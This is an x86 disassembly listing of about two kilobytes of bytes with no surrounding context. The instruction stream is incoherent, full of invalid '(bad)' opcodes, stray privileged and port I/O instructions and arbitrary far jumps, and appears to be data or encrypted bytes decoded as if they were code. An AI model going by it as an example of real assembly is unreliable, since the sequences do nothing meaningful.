  404bad:	shr    BYTE PTR [esi-0x6],0x82
  404bb1:	mov    bl,0xe8
  404bb3:	loopne 0x404c31
  404bb5:	cmp    DWORD PTR [ebx+0x6c4950bd],eax
  404bbb:	cmp    ebp,DWORD PTR [ecx+ebx*2-0x1f]
  404bbf:	je     0x404bd1
  404bc1:	sub    eax,0x62fb68d5
  404bc6:	(bad)  
  404bc7:	mov    ebx,0xbfa3524b
  404bcc:	add    eax,0xa6523178
  404bd1:	jl     0x404baa
  404bd3:	dec    ecx
  404bd4:	or     al,0x2
  404bd6:	xchg   ecx,eax
  404bd7:	stos   DWORD PTR es:[edi],eax
  404bd8:	cs daa 
  404bda:	js     0x404b9d
  404bdc:	mov    ds:0x75b4c373,al
  404be1:	rol    BYTE PTR [edi-0x2966527c],1
  404be7:	mov    edi,0x888212df
  404bec:	add    al,0xe
  404bee:	mov    BYTE PTR [edx-0x5d9adcfc],ch
  404bf4:	push   eax
  404bf5:	jle    0x404b99
  404bf7:	scas   al,BYTE PTR es:[edi]
  404bf8:	mov    ?,WORD PTR [esp+eax*8]
  404bfb:	sbb    esp,ebx
  404bfd:	add    dh,cl
  404bff:	shr    ah,0xa0
  404c02:	mov    ?,edx
  404c04:	shl    al,0x28
  404c07:	push   ds
  404c08:	jo     0x404c00
  404c0a:	adc    cl,BYTE PTR [eax-0x59]
  404c0d:	sbb    ebx,DWORD PTR [esi+edx*4-0x53]
  404c11:	mov    cs,WORD PTR [edi-0x53]
  404c14:	nop
  404c15:	inc    ecx
  404c16:	aad    0x1e
  404c18:	ins    BYTE PTR es:[edi],dx
  404c19:	lods   al,BYTE PTR ds:[esi]
  404c1a:	repz loopne 0x404c39
  404c1d:	icebp  
  404c1e:	(bad)  
  404c1f:	sbb    DWORD PTR [ebp+eiz*8+0x36e4e448],esp
  404c26:	dec    esi
  404c27:	cld    
  404c28:	(bad)
  404c2b:	xor    al,0x86
  404c2d:	or     cl,BYTE PTR [ebx+0x7b4351fa]
  404c33:	cmp    cl,BYTE PTR [edi+0x7dc7590e]
  404c39:	jmp    0x404c5b
  404c3b:	call   0x3878672d
  404c40:	repz (bad) 
  404c42:	cmp    esi,eax
  404c44:	(bad)  
  404c46:	sbb    dl,dh
  404c48:	cmp    DWORD PTR cs:[eax+ebx*2+0x3a],esi
  404c4d:	and    dl,BYTE PTR [eax-0x1cfbc6cf]
  404c53:	addr16 adc al,0x9e
  404c56:	pusha  
  404c57:	dec    esi
  404c58:	xor    ecx,esp
  404c5a:	sub    al,0xd3
  404c5c:	jmp    DWORD PTR [edi+0x5785a9a1]
  404c62:	imul   esp,DWORD PTR [esi-0x5e],0x56
  404c66:	mov    ds:0x76e70aca,eax
  404c6b:	pusha  
  404c6c:	clc    
  404c6d:	pusha  
  404c6e:	xchg   esi,eax
  404c6f:	stos   BYTE PTR es:[edi],al
  404c70:	xchg   ebp,eax
  404c71:	mov    ecx,es
  404c73:	mov    eax,0x4b566691
  404c78:	mov    eax,ds:0xe9c99b5d
  404c7d:	lahf   
  404c7e:	scas   al,BYTE PTR es:[edi]
  404c7f:	mov    ebp,0xd4c72288
  404c84:	std    
  404c85:	imul   edi,DWORD PTR [ecx-0x12ec822b],0xffffffa3
  404c8c:	scas   eax,DWORD PTR es:[edi]
  404c8d:	and    DWORD PTR [ebp-0x60],0xffffff8b
  404c91:	pop    edx
  404c92:	daa    
  404c93:	jae    0x404d0c
  404c95:	push   cs
  404c96:	outs   dx,DWORD PTR ds:[esi]
  404c97:	inc    eax
  404c98:	outs   dx,DWORD PTR ds:[esi]
  404c99:	dec    esp
  404c9a:	jmp    0x404cd7
  404c9c:	icebp  
  404c9d:	repz or BYTE PTR ds:0x53cdb591,al
  404ca4:	test   al,0xc8
  404ca6:	imul   DWORD PTR [esi]
  404ca8:	mov    ss,edx
  404caa:	out    dx,al
  404cab:	or     al,0x48
  404cad:	(bad)  
  404cae:	jne    0x404cb1
  404cb0:	and    BYTE PTR ds:[edi+0x66],dl
  404cb4:	jae    0x404cdc
  404cb6:	mov    DWORD PTR [ecx],0xac5a1fb7
  404cbc:	bound  ebp,QWORD PTR [eax-0x6c]
  404cbf:	iret   
  404cc0:	and    al,0x68
  404cc2:	dec    DWORD PTR [ecx-0x16]
  404cc5:	push   ebx
  404cc6:	xchg   esp,eax
  404cc7:	push   edx
  404cc8:	cmp    al,0x60
  404cca:	sbb    ecx,DWORD PTR [eax+eax*4]
  404ccd:	stc    
  404cce:	cli    
  404ccf:	and    cl,BYTE PTR [ecx-0x2d]
  404cd2:	fld    TBYTE PTR [eax]
  404cd4:	fist   WORD PTR [ebx+ebp*1+0x6dd97f16]
  404cdb:	test   DWORD PTR [edx],ebx
  404cdd:	and    eax,0xb78cce2c
  404ce2:	xchg   ebx,eax
  404ce3:	mov    esi,0x5a4ed710
  404ce8:	out    dx,ax
  404cea:	retf   
  404ceb:	in     al,dx
  404cec:	loop   0x404d57
  404cee:	iret   
  404cef:	int    0x24
  404cf1:	(bad)  
  404cf2:	dec    ebp
  404cf3:	push   edx
  404cf4:	retf   0x27e9
  404cf7:	mov    dh,0xca
  404cf9:	les    esp,FWORD PTR [eax+0x4dbfc41e]
  404cff:	ins    BYTE PTR es:[edi],dx
  404d00:	or     al,0xfc
  404d02:	rcl    BYTE PTR [esi+0x5b22bb59],0x7a
  404d09:	lock repnz dec eax
  404d0c:	jge    0x404cfa
  404d0e:	lds    edx,FWORD PTR [esp+ebp*8-0x59473eb5]
  404d15:	xchg   ebx,eax
  404d16:	es pushf 
  404d18:	mov    esi,0x700e2e81
  404d1d:	xchg   ebx,eax
  404d1e:	retf   0x5f08
  404d21:	dec    edi
  404d22:	mov    dl,BYTE PTR [edi]
  404d24:	fild   QWORD PTR [eax-0x26d4d039]
  404d2a:	(bad)  
  404d2b:	pushf  
  404d2c:	or     BYTE PTR [eax+0x44],al
  404d2f:	push   0x3727f73f
  404d34:	sti    
  404d35:	xchg   BYTE PTR ds:0x28292bc1,ah
  404d3b:	(bad)  
  404d3c:	fmul   DWORD PTR [ebx+0x56]
  404d3f:	or     eax,0x1ddf7a98
  404d44:	adc    eax,0xfaf19e1
  404d49:	sub    al,0xe
  404d4b:	rcl    DWORD PTR [eax+0x22e0fa01],cl
  404d51:	in     al,dx
  404d52:	in     eax,0xca
  404d54:	out    0x13,eax
  404d56:	xchg   esi,eax
  404d57:	xlat   BYTE PTR ds:[ebx]
  404d58:	add    eax,0x98882ae5
  404d5d:	aam    0x35
  404d5f:	jge    0x404dba
  404d61:	mov    al,ds:0x11a3860e
  404d66:	jno    0x404d45
  404d68:	ror    BYTE PTR [ebp+0x4b8b569c],0xc7
  404d6f:	inc    eax
  404d70:	and    eax,0x537b2853
  404d75:	jno    0x404d10
  404d77:	sbb    al,0x84
  404d79:	int    0x6e
  404d7b:	hlt    
  404d7c:	in     eax,dx
  404d7d:	shl    BYTE PTR [eax-0xe],cl
  404d80:	into   
  404d81:	xchg   DWORD PTR [esi-0x43],esp
  404d84:	and    ebx,DWORD PTR [eax]
  404d86:	icebp  
  404d87:	jmp    0x2467:0x1a2d2b72
  404d8e:	fisttp QWORD PTR [ecx]
  404d90:	cmp    al,0xd
  404d92:	inc    esp
  404d93:	lods   eax,DWORD PTR ds:[esi]
  404d94:	out    0x50,eax
  404d96:	cmp    al,0xd4
  404d98:	call   0x826f407e
  404d9d:	push   ss
  404d9e:	inc    esp
  404d9f:	in     al,0xf9
  404da1:	and    al,0xf1
  404da3:	xchg   edi,eax
  404da4:	sti    
  404da5:	inc    ebp
  404da6:	xor    eax,0x3d627128
  404dab:	clc    
  404dac:	shl    dl,1
  404dae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404daf:	add    eax,0x402532fe
  404db4:	int3   
  404db5:	scas   eax,DWORD PTR es:[edi]
  404db6:	les    ecx,FWORD PTR [edi-0x1]
  404db9:	shr    BYTE PTR [ebx],0xae
  404dbc:	cmp    esi,DWORD PTR [edi-0x183dc237]
  404dc2:	inc    edx
  404dc3:	imul   ecx,DWORD PTR [ebx+0x6a225330],0x1b
  404dca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404dcb:	mul    DWORD PTR [eax+0x1ea02b28]
  404dd1:	sti    
  404dd2:	cld    
  404dd3:	dec    ebp
  404dd4:	dec    esi
  404dd5:	dec    esp
  404dd6:	jns    0x404e42
  404dd8:	ret    0x68ea
  404ddb:	or     ax,0xfb42
  404ddf:	sbb    eax,0x3b469801
  404de4:	mov    dh,0xa3
  404de6:	xchg   ebx,eax
  404de7:	cdq    
  404de8:	cmc    
  404de9:	mov    ch,0x5b
  404deb:	aaa    
  404dec:	xchg   esp,eax
  404ded:	mov    al,0x8b
  404def:	add    BYTE PTR [esi],0xcd
  404df2:	in     eax,0xb7
  404df4:	inc    ebx
  404df5:	sub    eax,0x9e367412
  404dfa:	fiadd  DWORD PTR [ebx-0x28]
  404dfd:	xor    bl,BYTE PTR [edi]
  404dff:	or     eax,0xd0d84782
  404e04:	mov    esi,0x1a116a80
  404e09:	ds mov esi,0x3af82ac
  404e0f:	rcl    esp,1
  404e11:	in     eax,0x99
  404e13:	icebp  
  404e14:	xor    al,0xfa
  404e16:	jne    0x404dfd
  404e18:	test   eax,0xc776910e
  404e1d:	and    eax,0x9a53e52b
  404e22:	outs   dx,DWORD PTR ds:[esi]
  404e23:	fidiv  DWORD PTR [esi]
  404e25:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404e26:	iret   
  404e27:	cld    
  404e28:	dec    esi
  404e29:	xchg   esi,eax
  404e2a:	int    0x78
  404e2c:	inc    ebx
  404e2d:	mov    WORD PTR [edx],es
  404e2f:	or     bl,BYTE PTR [esi-0x4e44c24d]
  404e35:	push   esi
  404e36:	rol    esi,0x7a
  404e39:	outs   dx,BYTE PTR gs:[esi]
  404e3b:	jnp    0x404ea4
  404e3d:	cmp    BYTE PTR gs:[edx],cl
  404e40:	ja     0x404e97
  404e42:	add    eax,0x43a36928
  404e47:	jb     0x404df2
  404e49:	mov    eax,0xb3cecaa8
  404e4e:	push   ebx
  404e4f:	scas   al,BYTE PTR es:[edi]
  404e50:	and    ebp,edx
  404e52:	sub    DWORD PTR [ecx-0x4],ebx
  404e55:	mov    ch,0xf5
  404e57:	mov    ecx,0x70161900
  404e5c:	inc    esp
  404e5d:	les    esi,FWORD PTR [edi+0x7bf0e365]
  404e63:	sub    edx,DWORD PTR [edi-0x27ffbb33]
  404e69:	cdq    
  404e6a:	adc    al,0x33
  404e6c:	inc    eax
  404e6d:	repz cmp dl,al
  404e70:	jno    0x404ede
  404e72:	jnp    0x404e27
  404e74:	sub    bh,cl
  404e76:	ds jns 0x404eac
  404e79:	jnp    0x404e3b
  404e7b:	add    eax,0xf81cf6b1
  404e80:	aaa    
  404e81:	bound  ecx,QWORD PTR [edi+ebp*1+0x10e7263]
  404e88:	dec    ebp
  404e89:	jbe    0x404e92
  404e8b:	mov    ch,ah
  404e8d:	jge    0x404ea8
  404e8f:	adc    esp,ebx
  404e91:	enter  0x5562,0xa6
  404e95:	mov    eax,ds:0xff419a2b
  404e9a:	mov    al,0x4c
  404e9c:	test   DWORD PTR [edx],ebx
  404e9e:	xchg   ecx,eax
  404e9f:	and    DWORD PTR [edx+0xf67711c],ebx
  404ea5:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  404ea7:	xchg   ecx,eax
  404ea8:	cmp    BYTE PTR [ecx+0x3e],cl
  404eab:	inc    edx
  404eac:	add    al,0x22
  404eae:	xchg   dl,bl
  404eb0:	and    esp,DWORD PTR [eax]
  404eb2:	pop    edi
  404eb3:	xchg   ebp,eax
  404eb4:	sbb    DWORD PTR [ebx*2+0x15490931],esp
  404ebb:	(bad)  
  404ebd:	add    eax,eax
  404ebf:	(bad)  
  404ec0:	pop    esi
  404ec1:	ins    DWORD PTR es:[edi],dx
  404ec2:	lea    esp,[edi]
  404ec4:	loopne 0x404e59
  404ec6:	mov    ds:0x2308c68a,al
  404ecb:	pop    esi
  404ecc:	ins    DWORD PTR es:[edi],dx
  404ecd:	pop    ebx
  404ece:	mov    ah,bl
  404ed0:	jmp    0xcfac:0x35c070a1
  404ed7:	mov    eax,ds:0x90790b24
  404edc:	rcr    DWORD PTR [eax],1
  404ede:	je     0x404e65
  404ee0:	mov    cl,0xf5
  404ee2:	in     al,dx
  404ee3:	loopne 0x404f3e
  404ee5:	mov    ah,0xf2
  404ee7:	rol    ebp,1
  404ee9:	push   ds
  404eea:	stos   DWORD PTR es:[edi],eax
  404eeb:	loope  0x404efc
  404eed:	enter  0x7f26,0x65
  404ef1:	pop    edx
  404ef2:	jge    0x404f11
  404ef4:	inc    edx
  404ef5:	ds jg  0x404ea6
  404ef8:	xor    DWORD PTR [edx-0x27],eax
  404efb:	xor    DWORD PTR [ebx-0xc],ebp
  404efe:	arpl   WORD PTR [edi+0x2b],si
  404f01:	js     0x404f4c
  404f03:	xchg   esp,eax
  404f04:	add    ebx,edi
  404f06:	loopne 0x404ec6
  404f08:	es popa 
  404f0a:	dec    edi
  404f0b:	loope  0x404ebe
  404f0d:	lods   eax,DWORD PTR ds:[esi]
  404f0e:	sub    dh,BYTE PTR [ecx]
  404f10:	push   0xfa35e5f1
  404f15:	out    dx,eax
  404f16:	lock hlt 
  404f18:	mov    dl,0xcc
  404f1a:	and    al,0x75
  404f1c:	sbb    DWORD PTR [eax],0x6a078972
  404f22:	or     al,0xe2
  404f24:	jmp    0x651b:0x556c3d97
  404f2b:	das    
  404f2c:	sbb    BYTE PTR [ecx],bl
  404f2e:	or     eax,0xe2099e0d
  404f33:	lods   eax,DWORD PTR ds:[esi]
  404f34:	arpl   WORD PTR [eax+0x21],sp
  404f37:	or     BYTE PTR [edx-0xf3a0cc0],ah
  404f3d:	imul   esp,edx,0xffffff91
  404f40:	pop    ss
  404f41:	icebp  
  404f42:	jmp    0xe36d0c41
  404f47:	pop    ebp
  404f48:	rol    DWORD PTR [edx+0x54],1
  404f4b:	pusha  
  404f4c:	dec    ebp
  404f4d:	fwait
  404f4e:	adc    BYTE PTR [esi+eiz*4],dl
  404f51:	lods   al,BYTE PTR ds:[esi]
  404f52:	pop    esp
  404f53:	aas    
  404f54:	scas   al,BYTE PTR es:[edi]
  404f55:	aas    
  404f56:	call   0x1712:0x52dd01f8
  404f5d:	or     eax,0xf7e13215
  404f62:	loop   0x404fca
  404f64:	push   es
  404f65:	inc    ebx
  404f66:	adc    BYTE PTR ds:0xe0d4bebc,ch
  404f6c:	dec    ebx
  404f6d:	leave  
  404f6e:	stos   BYTE PTR es:[edi],al
  404f6f:	les    edx,FWORD PTR [edx+0x1438ade9]
  404f75:	pop    esi
  404f76:	sbb    cl,BYTE PTR [esi+0x274f96db]
  404f7c:	dec    esp
  404f7d:	jle    0x404f1d
  404f7f:	(bad)  
  404f80:	stos   BYTE PTR es:[edi],al
  404f81:	imul   esi,DWORD PTR [edx],0x6a
  404f84:	push   ebp
  404f85:	daa    
  404f86:	arpl   bp,di
  404f88:	push   eax
  404f89:	dec    ecx
  404f8a:	inc    eax
  404f8b:	adc    al,ah
  404f8d:	test   al,0xd2
  404f8f:	mov    esi,0x9ad6f078
  404f94:	nop
  404f95:	push   edi
  404f96:	and    BYTE PTR [eax+esi*8-0x36],dl
  404f9a:	sbb    DWORD PTR [eax-0x79606c0c],ecx
  404fa0:	cli    
  404fa1:	out    dx,eax
  404fa2:	pushf  
  404fa3:	popf   
  404fa4:	popf   
  404fa5:	cmp    eax,DWORD PTR [bx+si-0x23]
  404fa9:	jmp    0x404fd9
  404fab:	outs   dx,BYTE PTR ds:[esi]
  404fac:	xor    BYTE PTR gs:[eax],ch
  404faf:	push   cs
  404fb0:	bnd jle 0x405021
  404fb3:	mov    WORD PTR [esi+0x70877702],fs
  404fb9:	add    al,BYTE PTR [ecx+eax*1+0x44]
  404fbd:	aam    0x23
  404fbf:	cmp    al,0x78
  404fc1:	push   es
  404fc2:	jns    0x40503c
  404fc4:	fs call 0xfb1c:0x72b450a4
  404fcc:	add    edx,edi
  404fce:	mov    bl,0xaf
  404fd0:	sti    
  404fd1:	(bad)  
  404fd2:	icebp  
  404fd3:	adc    dl,BYTE PTR [eax]
  404fd5:	add    edx,DWORD PTR [edx-0x77]
  404fd8:	pop    ds
  404fd9:	xchg   edx,eax
  404fda:	rcr    BYTE PTR [edx-0x51],cl
  404fdd:	add    al,0x3e
  404fdf:	and    BYTE PTR [edx],ch
  404fe1:	test   BYTE PTR [eax+0x57604c43],al
  404fe7:	adc    ecx,DWORD PTR [ebx]
  404fe9:	(bad)  [ebx+esi*1+0x5b]
  404fed:	neg    DWORD PTR [edi+ebx*8+0x6a]
  404ff1:	mov    ds:0x945f2217,al
  404ff6:	lea    esi,[eax-0x27fff8a6]
  404ffc:	sub    eax,0x6e8d0af7
  405001:	pop    esi
  405002:	leave  
  405003:	jno    0x404fdb
  405005:	inc    eax
  405006:	pop    esi
  405007:	call   DWORD PTR [ecx]
  405009:	stos   DWORD PTR es:[edi],eax
  40500a:	outs   dx,DWORD PTR ds:[esi]
  40500b:	xchg   DWORD PTR [ebx+0x552ed38f],esi
  405011:	push   esi
  405012:	sahf   
  405013:	out    dx,eax
  405014:	mov    bl,BYTE PTR [edx+0x509f09f]
  40501a:	cmp    DWORD PTR [ebx+esi*2-0x25],edi
  40501e:	jne    0x405015
  405020:	leave  
  405021:	or     eax,0xebac6abc
  405026:	cmp    DWORD PTR [edx+0x3dba1051],esi
  40502c:	jmp    0x4860:0x74bd9f32
  405033:	mov    fs,WORD PTR [edx+edx*4-0x7ab3b1f2]
  40503a:	fnsave [eax-0x1956ce6e]
  405040:	stc    
  405041:	loopne 0x405069
  405043:	repnz cmp BYTE PTR [esp+ebp*1-0x1ed37c89],ch
  40504b:	cwde   
  40504c:	mov    ebx,0x8cb90ac2
  405051:	test   al,0x8a
  405053:	dec    edi
  405054:	fstp   DWORD PTR [edi+0x79]
  405057:	push   ds
  405058:	dec    ecx
  405059:	add    DWORD PTR [edi-0x6],ebp
  40505c:	ja     0x405083
  40505e:	std    
  40505f:	enter  0xd0d6,0x3e
  405063:	js     0x4050a1
  405065:	xor    eax,0xcab650f1
  40506a:	and    bl,BYTE PTR [edi+0x416e3a8c]
  405070:	ret    
  405071:	or     cl,BYTE PTR [ebp-0x5e94a5e9]
  405077:	mov    ecx,0x4da8e57f
  40507c:	cwde   
  40507d:	and    BYTE PTR [ebx],al
  40507f:	(bad)  
  405080:	shl    BYTE PTR [ecx-0x60c85607],1
  405086:	xchg   ebx,eax
  405087:	pop    esi
  405088:	jns    0x405098
  40508a:	jl     0x40507e
  40508c:	adc    ecx,DWORD PTR [ecx-0x7f]
  40508f:	aad    0xa2
  405091:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405092:	out    0x8a,eax
  405094:	mov    edx,0xc1f809e0
  405099:	(bad)  
  40509a:	loope  0x4050a8
  40509c:	ds and ch,BYTE PTR fs:[ecx-0x29]
  4050a1:	xor    DWORD PTR [ebx-0x512884c9],ebp
  4050a7:	daa    
  4050a8:	je     0x405071
  4050aa:	mov    ebx,ds
  4050ac:	shr    BYTE PTR [edi+0x6b19575f],0xd3
  4050b3:	mov    ah,0x10
  4050b5:	cmp    eax,0xae6685fc
  4050ba:	push   0xffffffb4
  4050bc:	adc    al,0xfd
  4050be:	pop    edi
  4050bf:	dec    eax
  4050c0:	(bad)  
  4050c1:	mov    cl,0xff
  4050c3:	xor    bl,BYTE PTR [ecx+0x0]
  4050c6:	add    edi,DWORD PTR [ebx]
  4050c8:	add    BYTE PTR [ecx+esi*2-0x5b],bh
  4050cc:	jns    0x405079
  4050ce:	loop   0x405101
  4050d0:	ins    BYTE PTR es:[edi],dx
  4050d1:	jb     0x4050c2
  4050d3:	cmp    eax,0x10
  4050d6:	mov    ecx,0xafa390e5
  4050db:	leave  
  4050dc:	xor    ecx,ebp
  4050de:	into   
  4050df:	call   0x54c3:0x25fb1069
  4050e6:	inc    edi
  4050e7:	fwait
  4050e8:	sbb    al,0x5f
  4050ea:	push   ebx
  4050eb:	shl    eax,cl
  4050ed:	push   ds
  4050ee:	cmp    BYTE PTR fs:[ebx],ah
  4050f1:	add    ecx,DWORD PTR [ebp-0x34cef7e0]
  4050f7:	xchg   ecx,eax
  4050f8:	push   ebx
  4050f9:	sub    DWORD PTR [edi],0xffffffbe
  4050fc:	js     0x4050a5
  4050fe:	mov    eax,ds:0x839f0f80
  405103:	lahf   
  405104:	lock fidivr DWORD PTR [edx-0xa]
  405108:	arpl   bx,sp
  40510a:	mov    al,0xdc
  40510c:	inc    edx
  40510d:	jg     0x405165
  40510f:	sahf   
  405110:	int    0xc7
  405112:	mov    al,ds:0x83a1d4f2
  405117:	mov    ch,0x8a
  405119:	data16 je 0x4050b0
  40511c:	hlt    
  40511d:	pop    ss
  40511e:	sbb    DWORD PTR [edx-0x6],edx
  405121:	push   eax
  405122:	icebp  
  405123:	es inc ebp
  405125:	clc    
  405126:	ffree  st(0)
  405128:	inc    eax
  405129:	loope  0x4050ee
  40512b:	fstp   DWORD PTR [ebp+edx*4+0x12]
  40512f:	call   0x266f5e4b
  405134:	inc    edi
  405135:	mov    bl,0x44
  405137:	scas   eax,DWORD PTR es:[edi]
  405138:	fidivr WORD PTR [ebx+ebx*2+0x2b5ead50]
  40513f:	aad    0x7a
  405141:	lock fild DWORD PTR [eax]
  405144:	ins    BYTE PTR es:[edi],dx
  405145:	mov    eax,ds:0x8bdf3dfc
  40514a:	pop    esi
  40514b:	es xor eax,0xe091c7c4
  405151:	sbb    DWORD PTR [eax+eax*4-0x54f028f0],edx
  405158:	das    
  405159:	dec    eax
  40515a:	jecxz  0x40515b
  40515c:	into   
  40515d:	xor    BYTE PTR [ecx-0xe],ah
  405160:	xchg   ebx,eax
  405161:	inc    ebx
  405162:	dec    edx
  405163:	push   esi
  405164:	pop    esp
  405165:	lock (bad) 
  405167:	jmp    FWORD PTR [eax+0x10]
  40516a:	mov    ?,WORD PTR [eax]
  40516c:	mov    al,ds:0x66ff6870
  405171:	sbb    al,0x6a
  405173:	ins    BYTE PTR es:[edi],dx
  405174:	pop    eax
  405175:	(bad)  
  405176:	or     BYTE PTR [ebx+0x3a1b39bb],0x67
  40517d:	sahf   
  40517e:	mov    eax,0xb7077398
  405183:	xor    al,0x65
  405185:	bound  edx,QWORD PTR [esi]
  405187:	sbb    eax,0xbe9dbb0e
  40518c:	in     al,0xbb
  40518e:	sbb    dl,BYTE PTR ds:0x53de205d
  405194:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405195:	or     al,0xda
  405197:	push   es
  405198:	gs pop ebp
  40519a:	lods   eax,DWORD PTR ds:[esi]
  40519b:	rcr    dh,1
  40519d:	mov    ebx,0xaa4bd47f
  4051a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4051a3:	mov    dh,BYTE PTR [edi+0xc]
  4051a6:	pop    es
  4051a7:	pop    ss
  4051a8:	inc    edx
  4051a9:	inc    ecx
  4051aa:	or     cl,dh
  4051ac:	xchg   al,ch
  4051ae:	push   ebx
  4051af:	lods   eax,DWORD PTR ds:[esi]
  4051b0:	pop    ebx
  4051b1:	shl    DWORD PTR [esp+ebx*2-0x57e9c954],1
  4051b8:	icebp  
  4051b9:	pop    edx
  4051ba:	or     al,0x79
  4051bc:	or     eax,0x5d45b8d2
  4051c1:	push   ebx
  4051c2:	popa   
  4051c3:	dec    ebp
  4051c4:	sub    BYTE PTR [ecx],ch
  4051c6:	xchg   edi,eax
  4051c7:	leave  
  4051c8:	fsubr  st,st(6)
  4051ca:	mov    ch,0xba
  4051cc:	aam    0x4b
  4051ce:	mov    edx,0x5b089a2b
  4051d3:	xor    DWORD PTR [edx-0x4718fd99],esi
  4051d9:	lahf   
  4051da:	int3   
  4051db:	adc    ebp,DWORD PTR [edi+0x7a2f57d6]
  4051e1:	cs mov dh,0x39
  4051e4:	mov    eax,0x7489169f
  4051e9:	test   al,0x1b
  4051eb:	int3   
  4051ec:	cwde   
  4051ed:	mov    edx,esi
  4051ef:	and    ecx,DWORD PTR [edx+0x4]
  4051f2:	fwait
  4051f3:	sub    eax,0x486e9ee1
  4051f8:	ins    DWORD PTR es:[edi],dx
  4051f9:	in     al,0x0
  4051fb:	ror    DWORD PTR [ebp+0x4bdb2bfe],cl
  405201:	gs mov al,0xe2
  405204:	(bad)  
  405205:	test   al,0x2e
  405207:	xchg   edx,eax
  405208:	ds imul esp,edx,0xffffffa8
  40520c:	mov    ebp,ebp
  40520e:	js     0x40526b
  405210:	jg     0x4051fb
  405212:	push   esp
  405213:	jne    0x405267
  405215:	call   0x69accc64
  40521a:	sub    eax,0xaf9c894c
  40521f:	imul   eax,DWORD PTR [edx],0xeab03e72
  405225:	xchg   esi,eax
  405226:	stos   BYTE PTR es:[edi],al
  405227:	out    dx,al
  405228:	ds push 0xee5feabb
  40522e:	mov    ch,0xeb
  405230:	inc    ebx
  405231:	mov    cl,0x31
  405233:	mov    gs,edi
  405235:	stos   DWORD PTR es:[edi],eax
  405236:	cmp    BYTE PTR [eax-0x5dc0e995],ah
  40523c:	xchg   edx,eax
  40523d:	test   al,0xcc
  40523f:	ficom  DWORD PTR [eax-0x45]
  405242:	jnp    0x4051fc
  405244:	stos   DWORD PTR es:[edi],eax
  405245:	int3   
  405246:	cwde   
  405247:	inc    ebp
  405248:	adc    ch,BYTE PTR [esp-0x4692b2ec]
  40524f:	ss pop ebp
  405251:	lods   eax,DWORD PTR ds:[esi]
  405252:	sbb    esi,DWORD PTR [eax-0x19]
  405255:	mov    ah,0x6e
  405257:	fst    DWORD PTR [ebx+0x1166049b]
  40525d:	dec    edx
  40525e:	fabs   
  405260:	xchg   edx,eax
  405261:	ins    DWORD PTR es:[edi],dx
  405262:	fist   DWORD PTR [eax+0x34]
  405265:	sbb    eax,0x52d3e8ac
  40526a:	(bad)  
  40526b:	mov    esi,DWORD PTR [esi+0x32]
  40526e:	test   al,0xac
  405270:	and    bh,BYTE PTR [esi]
  405272:	jne    0x405289
  405274:	jne    0x4052e9
  405276:	xor    bh,0xae
  405279:	or     ecx,ebp
  40527b:	cwde   
  40527c:	bound  eax,QWORD PTR [eax+0x7458a69e]
  405282:	les    eax,FWORD PTR [ecx+ecx*8-0x4f]
  405286:	hlt    
  405287:	int    0x9
  405289:	es pop ebx
  40528b:	fwait
  40528c:	ror    BYTE PTR [eax+eiz*1+0x54],0xbb
  405291:	addr16 and al,0xe8
  405294:	enter  0xebe6,0xd5
  405298:	lods   eax,DWORD PTR ds:[esi]
  405299:	ret    0xa9f3
  40529c:	out    0x4a,al
  40529e:	mov    ch,0x8a
  4052a0:	adc    DWORD PTR [eax],ebx
  4052a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4052a3:	sub    dh,BYTE PTR [edi]
  4052a5:	(bad)  
  4052a6:	fisub  DWORD PTR [ebx-0x6b]
  4052a9:	in     al,0xaf
  4052ab:	cmp    ch,BYTE PTR [edx]
  4052ad:	in     eax,0x9
  4052af:	mov    al,0xde
  4052b1:	mov    bl,0xc9
  4052b3:	jo     0x405292
  4052b5:	inc    edi
  4052b6:	xchg   BYTE PTR [ecx-0x3fb1d493],bh
  4052bc:	inc    edx
  4052bd:	into   
  4052be:	jno    0x4052c4
  4052c0:	aas    
  4052c1:	lea    eax,[ebp-0x511a236a]
  4052c7:	jae    0x4052cf
  4052c9:	push   edi
  4052ca:	jnp    0x405257
  4052cc:	sbb    esp,DWORD PTR [ecx+0x37611c0f]
  4052d2:	iret   
  4052d3:	xor    esi,DWORD PTR [ebx-0x75]
  4052d6:	jo     0x4052e4
  4052d8:	xor    BYTE PTR [edi+0x57b2b62d],dh
  4052de:	loopne 0x40535e
  4052e0:	push   ds
  4052e1:	mov    edi,0x93c14dba
  4052e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4052e7:	sti    
  4052e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4052e9:	mov    ds:0xa93ae695,eax
  4052ee:	xor    BYTE PTR [ebx+0x7f],0xe8
  4052f2:	loope  0x40530e
  4052f4:	fs jbe 0x4052b8
  4052f7:	mov    edx,0xb2125ac3
  4052fc:	and    ebx,ecx
  4052fe:	lds    edx,FWORD PTR [edi-0xc]
  405301:	dec    edi
  405302:	leave  
  405303:	ins    DWORD PTR es:[edi],dx
  405304:	inc    esi
  405305:	mov    esi,0x4e6d09b4
  40530a:	enter  0x953b,0x68
  40530e:	ins    DWORD PTR es:[edi],dx
  40530f:	out    0x88,al
  405311:	mov    ah,0x9e
  405313:	out    0xe8,eax
  405315:	les    ecx,FWORD PTR [esi+0x7171e418]
  40531b:	and    DWORD PTR [eax-0x6617c8eb],0x7d
  405322:	or     al,BYTE PTR [eax+eiz*8-0x51]
  405326:	push   0x75
  405328:	clc    
  405329:	or     eax,DWORD PTR [edi-0x22]
  40532c:	in     al,0x22
  40532e:	jmp    0xbe64:0x3c428747
  405335:	pop    es
  405336:	sub    ah,BYTE PTR [ecx+0x16b774e0]
  40533c:	sbb    al,0x3d
  40533e:	sub    dl,BYTE PTR [ecx-0x17]
  405341:	call   0xb119:0x63e6e241
  405348:	popf   
  405349:	les    ebp,FWORD PTR [ebp+0x23fc42c9]
  40534f:	xor    bh,BYTE PTR ds:0x6c716d27
  405355:	push   ebp
  405356:	jle    0x4053c6
  405358:	add    edx,DWORD PTR [ecx+0x45db92c0]
  40535e:	pop    esi
  40535f:	fimul  WORD PTR [esi-0x3a4b19e5]
  405365:	dec    edi
  405366:	(bad)
  405369:	or     al,0x7e
  40536b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40536c:	je     0x4053b1
